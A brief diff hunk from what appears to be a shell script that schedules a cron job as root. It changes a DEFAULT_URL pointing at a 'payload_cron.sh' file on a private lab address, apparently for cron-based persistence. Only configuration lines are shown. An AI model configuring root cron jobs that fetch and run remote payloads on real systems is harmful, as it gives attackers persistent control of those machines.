@@ -7,7 +7,7 @@ CRON_USER="root"
 SHELL_BIN="/bin/sh"                  
 PATH_SAFE="/usr/sbin:/usr/bin:/sbin:/bin"
 
-DEFAULT_URL="http://192.168.56.1/payloads/payload_cron.sh"
+DEFAULT_URL="http://192.168.56.1/payload_cron.sh"
 
 log() { echo "[$(date +'%F %T')] $*"; }
 
